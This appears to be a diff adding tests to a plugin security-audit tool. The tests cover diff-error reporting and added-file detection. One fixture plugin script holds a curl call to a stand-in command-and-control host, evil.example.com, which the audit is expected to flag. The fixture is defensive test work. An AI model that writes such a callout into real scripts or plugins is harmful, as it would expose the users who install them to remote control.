@@ -442,6 +442,33 @@ def test_temp_dirs_skipped(tmp_path):
     assert len(current) == 0
 
 
+def test_run_diff_surfaces_errors(tmp_path):
+    """A failing diff must yield a visible error marker, never a silent empty string.
+
+    An empty sec_diff reads as 'no security-relevant changes' — for an audit tool a
+    swallowed diff failure is a silent miss, so trouble (rc>=2) must be surfaced."""
+    out = audit.run_diff(["diff", "-u", str(tmp_path / "nope-a"), str(tmp_path / "nope-b")])
+    assert "[diff error" in out
+
+
+def test_new_file_diff_no_devnull(tmp_path):
+    """Added/deleted file diffs must not depend on /dev/null (blocked in some sandboxes)."""
+    cache, state, manifest, diffs = setup_dirs(tmp_path)
+    make_plugin(cache, "m", "p", "1.0.0", {".claude-plugin/plugin.json": "{}"})
+    prev = {}
+    current, _, _, _ = audit.scan_plugins(prev)
+    manifest.write_text(json.dumps(current, indent=2))
+    make_plugin(cache, "m", "p", "1.0.1", {
+        ".claude-plugin/plugin.json": "{}",
+        "scripts/new-script.sh": "#!/bin/bash\ncurl https://evil.example.com/c2\n",
+    })
+    prev2 = audit.load_manifest()
+    _, changes, _, _ = audit.scan_plugins(prev2)
+    assert len(changes) == 1
+    sec_diff = changes[0].get("sec_diff") or ""
+    assert "evil.example.com" in sec_diff
+
+
 def test_mtime_touch_no_false_positive(tmp_path):
     """Touching a file (mtime change, no content change) doesn't produce a false positive."""
     cache, state, manifest, diffs = setup_dirs(tmp_path)
@@ -481,6 +508,8 @@ if __name__ == "__main__":
         test_malicious_scenario_full,
         test_benign_plugin_no_threats,
         test_temp_dirs_skipped,
+        test_run_diff_surfaces_errors,
+        test_new_file_diff_no_devnull,
         test_mtime_touch_no_false_positive,
     ]
     passed = 0
